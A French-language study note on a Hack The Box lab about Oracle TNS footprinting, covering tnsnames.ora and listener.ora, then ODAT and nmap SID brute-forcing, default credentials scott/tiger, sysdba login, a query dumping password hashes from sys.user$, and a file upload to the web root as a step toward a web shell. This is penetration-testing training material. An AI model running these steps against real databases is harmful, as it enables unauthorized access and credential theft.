[[Footprinting HTB]]
Le serveur `Oracle Transparent Network Substrate` (`TNS`) est un protocole de communication qui facilite la communication entre les bases de données et les applications Oracle sur les réseaux. Initialement introduit dans le cadre de la suite logicielle [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html), le TNS prend en charge divers protocoles de mise en réseau entre les bases de données Oracle et les applications clientes, tels que les piles de protocoles `IPX/SPX` et `TCP/IP`. Par conséquent, il est devenu une solution privilégiée pour la gestion de bases de données volumineuses et complexes dans les secteurs de la santé, de la finance et de la vente au détail. De plus, son mécanisme de chiffrement intégré garantit la sécurité des données transmises, ce qui en fait une solution idéale pour les environnements d'entreprise où la sécurité des données est primordiale.

Au fil du temps, le TNS a été mis à jour pour prendre en charge les technologies plus récentes, notamment le chiffrement `IPv6` et `SSL/TLS`, ce qui le rend plus adapté aux fins suivantes :

|||||
|---|---|---|---|
|Résolution de noms|Gestion des connexions|Équilibrage de charge|Sécurité|

De plus, il permet le chiffrement des communications entre le client et le serveur grâce à une couche de sécurité supplémentaire au-dessus de la couche du protocole TCP/IP. Cette fonctionnalité aide à sécuriser l'architecture de la base de données contre les accès non autorisés ou les attaques qui tentent de compromettre les données sur le trafic réseau. En outre, il fournit des outils et des capacités avancés pour les administrateurs de base de données et les développeurs, car il offre des outils complets de surveillance et d'analyse des performances, des capacités de rapport d'erreurs et de journalisation, la gestion de la charge de travail et la tolérance aux pannes (fault tolerance) via les services de base de données.

---

## Configuration par défaut

La configuration par défaut du serveur Oracle TNS varie en fonction de la version et de l'édition du logiciel Oracle installé. Cependant, certains paramètres courants sont généralement configurés par défaut dans Oracle TNS. Par défaut, le listener écoute les connexions entrantes sur le port `TCP/1521`. Cependant, ce port par défaut peut être modifié lors de l'installation ou plus tard dans le fichier de configuration. Le listener TNS est configuré pour prendre en charge divers protocoles réseau, notamment `TCP/IP`, `UDP`, `IPX/SPX` et `AppleTalk`. Le listener peut également prendre en charge plusieurs interfaces réseau et écouter sur des adresses IP spécifiques ou sur toutes les interfaces réseau disponibles. Par défaut, Oracle TNS peut être géré à distance dans `Oracle 8i`/`9i` mais pas dans Oracle 10g/11g.

La configuration par défaut du listener TNS inclut également quelques fonctionnalités de sécurité de base. Par exemple, le listener n'acceptera que les connexions provenant d'hôtes autorisés et effectuera une authentification de base à l'aide d'une combinaison de noms d'hôte, d'adresses IP, ainsi que de noms d'utilisateur et de mots de passe. De plus, le listener utilisera Oracle Net Services pour chiffrer la communication entre le client et le serveur. Les fichiers de configuration pour Oracle TNS sont appelés `tnsnames.ora` et `listener.ora` et se trouvent généralement dans le répertoire `$ORACLE_HOME/network/admin`. Le fichier en texte brut contient des informations de configuration pour les instances de base de données Oracle et d'autres services réseau qui utilisent le protocole TNS.

Oracle TNS est souvent utilisé avec d'autres services Oracle comme Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, des serveurs web, et bien d'autres. De nombreuses modifications ont été apportées à l'installation par défaut des services Oracle. Par exemple, Oracle 9 a un mot de passe par défaut, `CHANGE_ON_INSTALL`, tandis qu'Oracle 10 n'a pas de mot de passe par défaut défini. Le service Oracle DBSNMP utilise également un mot de passe par défaut, `dbsnmp`, que nous devrions nous rappeler lorsque nous le rencontrons. Un autre exemple serait que de nombreuses organisations utilisent encore le service `finger` avec Oracle, ce qui peut mettre en péril le service d'Oracle et le rendre vulnérable lorsque nous avons la connaissance requise d'un répertoire personnel.

Chaque base de données ou service a une entrée unique dans le fichier [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007), contenant les informations nécessaires pour que les clients se connectent au service. L'entrée se compose d'un nom pour le service, de l'emplacement réseau du service et du nom de la base de données ou du service que les clients doivent utiliser lors de la connexion au service. Par exemple, un fichier `tnsnames.ora` simple pourrait ressembler à ceci :

#### Tnsnames.ora

        txt
`ORCL =   (DESCRIPTION =     (ADDRESS_LIST =       (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))     )     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = orcl)     )   )`

Ici, nous pouvons voir un service appelé `ORCL`, qui écoute sur le port `TCP/1521` à l'adresse IP `10.129.11.102`. Les clients doivent utiliser le nom de service `orcl` lors de la connexion au service. Cependant, le fichier tnsnames.ora peut contenir de nombreuses entrées de ce type pour différentes bases de données et services. Les entrées peuvent également inclure des informations supplémentaires, telles que des détails d'authentification, des paramètres de regroupement de connexions (connection pooling) et des configurations d'équilibrage de charge.

D'autre part, le fichier `listener.ora` est un fichier de configuration côté serveur qui définit les propriétés et les paramètres du processus du listener, qui est responsable de la réception des requêtes client entrantes et de leur transmission à l'instance de base de données Oracle appropriée.

#### Listener.ora

        txt
`SID_LIST_LISTENER =   (SID_LIST =     (SID_DESC =       (SID_NAME = PDB1)       (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)       (GLOBAL_DBNAME = PDB1)       (SID_DIRECTORY_LIST =         (SID_DIRECTORY =           (DIRECTORY_TYPE = TNS_ADMIN)           (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)         )       )     )   )  LISTENER =   (DESCRIPTION_LIST =     (DESCRIPTION =       (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))       (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))     )   )  ADR_BASE_LISTENER = C:\oracle`

En bref, le logiciel Oracle Net Services côté client utilise le fichier `tnsnames.ora` pour résoudre les noms de service en adresses réseau, tandis que le processus du listener utilise le fichier `listener.ora` pour déterminer les services qu'il doit écouter et le comportement du listener.

Les bases de données Oracle peuvent être protégées en utilisant une `PL/SQL Exclusion List` (liste d'exclusion PL/SQL). Il s'agit d'un fichier texte créé par l'utilisateur qui doit être placé dans le répertoire `$ORACLE_HOME/sqldeveloper`, et il contient les noms des paquets ou types PL/SQL qui doivent être exclus de l'exécution. Une fois le fichier de la liste d'exclusion PL/SQL créé, il peut être chargé dans l'instance de la base de données. Il sert de liste noire (blacklist) qui ne peut pas être accédée via l'Oracle Application Server.

|**Paramètre**|**Description**|
|---|---|
|`DESCRIPTION`|Un descripteur qui fournit un nom pour la base de données et son type de connexion.|
|`ADDRESS`|L'adresse réseau de la base de données, qui inclut le nom d'hôte et le numéro de port.|
|`PROTOCOL`|Le protocole réseau utilisé pour la communication avec le serveur|
|`PORT`|Le numéro de port utilisé pour la communication avec le serveur|
|`CONNECT_DATA`|Spécifie les attributs de la connexion, tels que le nom du service ou le SID, le protocole et l'identifiant de l'instance de la base de données.|
|`INSTANCE_NAME`|Le nom de l'instance de la base de données à laquelle le client veut se connecter.|
|`SERVICE_NAME`|Le nom du service auquel le client veut se connecter.|
|`SERVER`|Le type de serveur utilisé pour la connexion à la base de données, tel que dédié ou partagé.|
|`USER`|Le nom d'utilisateur utilisé pour s'authentifier auprès du serveur de base de données.|
|`PASSWORD`|Le mot de passe utilisé pour s'authentifier auprès du serveur de base de données.|
|`SECURITY`|Le type de sécurité pour la connexion.|
|`VALIDATE_CERT`|Indique s'il faut valider le certificat en utilisant SSL/TLS.|
|`SSL_VERSION`|La version de SSL/TLS à utiliser pour la connexion.|
|`CONNECT_TIMEOUT`|Le délai en secondes pour que le client établisse une connexion à la base de données.|
|`RECEIVE_TIMEOUT`|Le délai en secondes pour que le client reçoive une réponse de la base de données.|
|`SEND_TIMEOUT`|Le délai en secondes pour que le client envoie une requête à la base de données.|
|`SQLNET.EXPIRE_TIME`|Le délai en secondes pour que le client détecte qu'une connexion a échoué.|
|`TRACE_LEVEL`|Le niveau de traçage pour la connexion à la base de données.|
|`TRACE_DIRECTORY`|Le répertoire où les fichiers de trace sont stockés.|
|`TRACE_FILE_NAME`|Le nom du fichier de trace.|
|`LOG_FILE`|Le fichier où les informations de journal sont stockées.|

Avant de pouvoir énumérer le listener TNS et interagir avec lui, nous devons télécharger quelques paquets et outils pour notre instance `Pwnbox` au cas où elle ne les aurait pas déjà. Voici une liste de commandes qui fait tout cela :

#### Mise en place - ODAT

        shellsession
`ppporrkkky@htb[/htb]$ sudo apt-get update sudo apt-get install -y build-essential python3-dev libaio1 cd ~ wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz tar xzf cx_Oracle-8.3.0.tar.gz cd cx_Oracle-8.3.0 python3 setup.py build sudo python3 setup.py install cd ~ git clone https://github.com/quentinhardy/odat.git cd odat/ pip install python-libnmap git submodule init git submodule update sudo apt-get install python3-scapy -y sudo pip3 install colorlog termcolor passlib python-libnmap sudo apt-get install build-essential libgmp-dev -y pip3 install pycryptodome pip3 install openpyxl  Hit:1 https://deb.parrot.sh/parrot lory InRelease Hit:2 https://deb.parrot.sh/direct/parrot lory-security InRelease Hit:3 https://deb.parrot.sh/parrot lory-backports InRelease Reading package lists... Done Reading package lists... Done Building dependency tree... Done Reading state information... Done build-essential is already the newest version (12.9). python3-dev is already the newest version (3.11.2-1+b1). python3-dev set to manually installed. libaio1 is already the newest version (0.3.113-4). libaio1 set to manually installed.  <SNIP>`

Après cela, nous pouvons essayer de déterminer si l'installation a réussi en exécutant la commande suivante :

#### Test de ODAT

        shellsession
`ppporrkkky@htb[/htb]$ ./odat.py -h  usage: odat.py [-h] [--version]                {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}                ...              _  __   _  ___             / \|  \ / \|_ _|           ( o ) o ) o || |             \_/|__/|_n_||_|  -------------------------------------------   _        __           _           ___   / \      |  \         / \         |_ _| ( o )       o )         o |         | |   \_/racle |__/atabase |_n_|ttacking |_|ool  -------------------------------------------  By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com) <SNIP>`

Oracle Database Attacking Tool (`ODAT`) est un outil de test d'intrusion (penetration testing) open-source écrit en Python et conçu pour énumérer et exploiter les vulnérabilités dans les bases de données Oracle. Il peut être utilisé pour identifier et exploiter diverses failles de sécurité dans les bases de données Oracle, y compris l'injection SQL (SQL injection), l'exécution de code à distance (remote code execution) et l'escalade de privilèges (privilege escalation).

Utilisons maintenant `nmap` pour scanner le port par défaut du listener Oracle TNS.

#### Nmap

        shellsession
`ppporrkkky@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open  Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST Nmap scan report for 10.129.204.235 Host is up (0.0041s latency).  PORT     STATE SERVICE    VERSION 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds`

Nous pouvons voir que le port est ouvert et que le service est en cours d'exécution. Dans Oracle RDBMS, un identifiant de système (`System Identifier` ou `SID`) est un nom unique qui identifie une instance de base de données particulière. Il peut y avoir plusieurs instances, chacune avec son propre ID système. Une instance est un ensemble de processus et de structures de mémoire qui interagissent pour gérer les données de la base de données. Lorsqu'un client se connecte à une base de données Oracle, il spécifie le `SID` de la base de données avec sa chaîne de connexion. Le client utilise ce SID pour identifier à quelle instance de base de données il souhaite se connecter. Si le client ne spécifie pas de SID, la valeur par défaut définie dans le fichier `tnsnames.ora` est utilisée.

Les SID sont un élément essentiel du processus de connexion, car ils identifient l'instance spécifique de la base de données à laquelle le client souhaite se connecter. Si le client spécifie un SID incorrect, la tentative de connexion échouera. Les administrateurs de base de données peuvent utiliser le SID pour surveiller et gérer les instances individuelles d'une base de données. Par exemple, ils peuvent démarrer, arrêter ou redémarrer une instance, ajuster son allocation de mémoire ou d'autres paramètres de configuration, et surveiller ses performances à l'aide d'outils comme Oracle Enterprise Manager.

Il existe différentes manières d'énumérer, ou plutôt de deviner les SID. Par conséquent, nous pouvons utiliser des outils comme `nmap`, `hydra`, `odat`, et d'autres. Utilisons d'abord `nmap`.

#### Nmap - Force brute de SID

        shellsession
`ppporrkkky@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute  Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST Nmap scan report for 10.129.204.235 Host is up (0.0044s latency).  PORT     STATE SERVICE    VERSION 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) | oracle-sid-brute:  |_  XE  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds`

Nous pouvons utiliser l'outil `odat.py` pour effectuer une variété de scans afin d'énumérer et de recueillir des informations sur les services de la base de données Oracle et ses composants. Ces scans peuvent récupérer les noms de bases de données, les versions, les processus en cours, les comptes d'utilisateurs, les vulnérabilités, les mauvaises configurations, etc. Utilisons l'option `all` et essayons tous les modules de l'outil `odat.py`.

#### ODAT

        shellsession
`ppporrkkky@htb[/htb]$ ./odat.py all -s 10.129.204.235  [+] Checking if target 10.129.204.235:1521 is well configured for a connection... [+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...  <SNIP>  [!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16  [!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05  [!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59 [+] Valid credentials found: scott/tiger. Continue...  <SNIP>`

Dans cet exemple, nous avons trouvé des identifiants valides pour l'utilisateur `scott` et son mot de passe `tiger`. Après cela, nous pouvons utiliser l'outil `sqlplus` pour nous connecter à la base de données Oracle et interagir avec elle.

Avant de pouvoir utiliser `sqlplus` sur notre `Pwnbox`, nous devons mettre à jour et mettre à niveau `parrot-core` et installer le paquet `oracle-instantclient-sqlplus`.

#### Mise en place - SQLplus

        shellsession
`ppporrkkky@htb[/htb]$ sudo apt update sudo apt upgrade parrot-core sudo apt update sudo apt install oracle-instantclient-sqlplus Hit:1 https://deb.parrot.sh/parrot lory InRelease Hit:2 https://deb.parrot.sh/direct/parrot lory-security InRelease Hit:3 https://deb.parrot.sh/parrot lory-backports InRelease Reading package lists... Done Building dependency tree... Done Reading state information... Done 99 packages can be upgraded. Run 'apt list --upgradable' to see them. <SNIP> Selecting previously unselected package oracle-instantclient-sqlplus. (Reading database ... 597500 files and directories currently installed.) Preparing to unpack .../oracle-instantclient-sqlplus_19.6.0.0.0-0parrot2_amd64.deb ... Unpacking oracle-instantclient-sqlplus (19.6.0.0.0-0parrot2) ... Setting up oracle-instantclient-sqlplus (19.6.0.0.0-0parrot2) ... Scanning application launchers Removing duplicate launchers or broken launchers Launchers are updated`

Si vous rencontrez l'erreur suivante `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, veuillez exécuter la commande ci-dessous, tirée de [ce lien](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

        shellsession
`ppporrkkky@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig`

Enfin, nous pouvons exécuter `sqlplus -v` pour vérifier si l'outil s'exécute sans erreurs.

        shellsession
`ppporrkkky@htb[/htb]$ sqlplus -v  SQL*Plus: Release 19.0.0.0.0 - Production Version 19.6.0.0.0`

#### SQLplus - Connexion

        shellsession
`ppporrkkky@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE  SQL*Plus: Release 19.0.0.0.0 - Production Version 19.6.0.0.0  Copyright (c) 1982, 2021, Oracle. All rights reserved.  ERROR: ORA-28002: the password will expire within 7 days    Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production  SQL>` 

Il existe de nombreuses [commandes SQLplus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) que nous pouvons utiliser pour énumérer la base de données manuellement. Par exemple, nous pouvons lister toutes les tables disponibles dans la base de données actuelle ou nous montrer les privilèges de l'utilisateur actuel comme suit :

#### Oracle RDBMS - Interaction

        shellsession
`SQL> select table_name from all_tables;  TABLE_NAME ------------------------------ DUAL SYSTEM_PRIVILEGE_MAP TABLE_PRIVILEGE_MAP STMT_AUDIT_OPTION_MAP AUDIT_ACTIONS WRR$_REPLAY_CALL_FILTER HS_BULKLOAD_VIEW_OBJ HS$_PARALLEL_METADATA HS_PARTITION_COL_NAME HS_PARTITION_COL_TYPE HELP  <SNIP>   SQL> select * from user_role_privs;  USERNAME                       GRANTED_ROLE                   ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SCOTT                          CONNECT                        NO  YES NO SCOTT                          RESOURCE                       NO  YES NO`

Ici, l'utilisateur `scott` n'a pas de privilèges administratifs. Cependant, nous pouvons essayer d'utiliser ce compte pour nous connecter en tant qu'administrateur de base de données système (`sysdba`), ce qui nous donnera des privilèges plus élevés. C'est possible lorsque l'utilisateur `scott` a les privilèges appropriés, généralement accordés par l'administrateur de la base de données ou utilisés par l'administrateur lui-même.

#### Oracle RDBMS - Énumération de la base de données

        shellsession
`ppporrkkky@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba  SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023 Version 21.4.0.0.0  Copyright (c) 1982, 2021, Oracle. All rights reserved.   Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production   SQL> select * from user_role_privs;  USERNAME                       GRANTED_ROLE                   ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO SYS                            AQ_USER_ROLE                   YES YES NO SYS                            AUTHENTICATEDUSER              YES YES NO SYS                            CONNECT                        YES YES NO SYS                            CTXAPP                         YES YES NO SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO SYS                            DBA                            YES YES NO SYS                            DBFS_ROLE                      YES YES NO  USERNAME                       GRANTED_ROLE                   ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS                            DELETE_CATALOG_ROLE            YES YES NO SYS                            EXECUTE_CATALOG_ROLE           YES YES NO <SNIP>`

Nous pouvons suivre de nombreuses approches une fois que nous avons accès à une base de données Oracle. Cela dépend fortement des informations dont nous disposons et de la configuration globale. Cependant, nous ne pouvons pas ajouter de nouveaux utilisateurs ni apporter de modifications. À partir de ce point, nous pourrions récupérer les hashs de mots de passe de `sys.user$` et essayer de les cracker hors ligne. La requête pour cela ressemblerait à ce qui suit :

#### Oracle RDBMS - Extraire les hashs de mots de passe

        shellsession
`SQL> select name, password from sys.user$;  NAME                           PASSWORD ------------------------------ ------------------------------ SYS                            FBA343E7D6C8BC9D PUBLIC CONNECT RESOURCE DBA SYSTEM                         B5073FE1DE351687 SELECT_CATALOG_ROLE EXECUTE_CATALOG_ROLE DELETE_CATALOG_ROLE OUTLN                          4A3BA55E08595C81 EXP_FULL_DATABASE  NAME                           PASSWORD ------------------------------ ------------------------------ IMP_FULL_DATABASE LOGSTDBY_ADMINISTRATOR <SNIP>`

Une autre option consiste à téléverser un web shell sur la cible. Cependant, cela nécessite que le serveur exécute un serveur web, et nous devons connaître l'emplacement exact du répertoire racine du serveur web. Néanmoins, si nous savons à quel type de système nous avons affaire, nous pouvons essayer les chemins par défaut, qui sont :

|**OS**|**Chemin**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

Il est toujours important d'essayer d'abord notre approche d'exploitation avec des fichiers qui ne semblent pas dangereux pour les antivirus ou les systèmes de détection/prévention d'intrusion. Par conséquent, nous créons un fichier texte avec une chaîne de caractères et l'utilisons pour le téléverser sur le système cible.

#### Oracle RDBMS - Téléversement de fichier

        shellsession
`ppporrkkky@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt ppporrkkky@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt  [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                   [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file`

Enfin, nous pouvons tester si l'approche de téléversement de fichier a fonctionné avec `curl`. Pour ce faire, nous utiliserons une requête `GET http://<IP>`, ou nous pouvons visiter via un navigateur.

        shellsession
`ppporrkkky@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt  Oracle File Upload Test`

LAB de fin 

![Pasted image 20260909232940.png](/assets/img/writeups/Pasted image 20260909232940.png)

la commande de connexion :
sqlplus scott/tiger@$ip/XE as sysdba

![Pasted image 20260909233058.png](/assets/img/writeups/Pasted image 20260909233058.png)

la commande d'énum des mots de passe : 
select name , password from sys.user$;

![Pasted image 20260909233323.png](/assets/img/writeups/Pasted image 20260909233323.png)

on a notre cible 
